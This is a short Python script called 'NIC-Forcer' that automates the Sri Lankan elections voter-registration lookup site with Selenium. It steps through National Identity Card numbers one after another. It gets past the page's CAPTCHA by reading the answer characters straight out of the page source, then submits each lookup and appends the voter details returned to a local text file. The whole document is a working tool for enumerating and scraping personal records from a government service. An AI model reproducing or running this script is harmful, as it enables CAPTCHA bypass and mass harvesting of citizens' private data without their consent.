#  HiMasH  
#  https://github.com/himash/NIC-Forcer

from selenium import webdriver
from selenium.webdriver.common.keys import Keys   # importing libraries
from bs4 import BeautifulSoup
import time
import codecs


browser = webdriver.Chrome()               # chrome driver 
browser.get("http://eservices.elections.gov.lk/myVoterRegistrationLGA.aspx")  # server url
time.sleep(10)
nicno = 942390980  # nic number to start with

for i in range(1,2):
   
  nicno = nicno + 1
  nicno2 = str(nicno) + str("v")
  print nicno2
  username = browser.find_element_by_id("ContentPlaceHolder1_txtNIC")
  browser.find_element_by_id("ContentPlaceHolder1_txtNIC").clear()
  username.send_keys(nicno2)
  codenum =  browser.find_element_by_id("ContentPlaceHolder1_txtCode")


  page = browser.page_source
  bs = BeautifulSoup(page,"lxml")

  catcha1 = bs.find_all(id='ContentPlaceHolder1_imbC1')
  catcha2 = bs.find_all(id='ContentPlaceHolder1_imbC2')
  catcha3 = bs.find_all(id='ContentPlaceHolder1_imbC3')
  catcha4 = bs.find_all(id='ContentPlaceHolder1_imbC4')
  catcha5 = bs.find_all(id='ContentPlaceHolder1_imbC5')
  capcon1 = str(catcha1)
  capcon2 = str(catcha2)
  capcon3 = str(catcha3)
  capcon4 = str(catcha4)
  capcon5 = str(catcha5)

  code = capcon1[96] , capcon2[96], capcon3[96], capcon4[96], capcon5[96]
  

  time.sleep(1)

  codenum.send_keys(code)
  signInButton = browser.find_element_by_id('ContentPlaceHolder1_cmdDisplay')
  signInButton.click()
  time.sleep(4)

  page = browser.page_source
  bs = BeautifulSoup(page,"lxml")

  
  
  

  wi = bs.find("span",id ="ContentPlaceHolder1_lblWarning" )
  wi2 = wi.text
  print wi2
  if len(wi2) < 2:
    print "no"

  details = bs.find(id='ContentPlaceHolder1_DetailsView')
  
  table_rows = details.find_all('tr')


  for tr in table_rows:
      td = tr.find_all('td')
      row = [i.text for i in td]
      str1 = ''.join(row)
      print str1
      defile = codecs.open("gg.txt","a+", "utf-8")  # file to store the data
      defile.write(str1)
      defile.write("\n")

  defile.close()
  
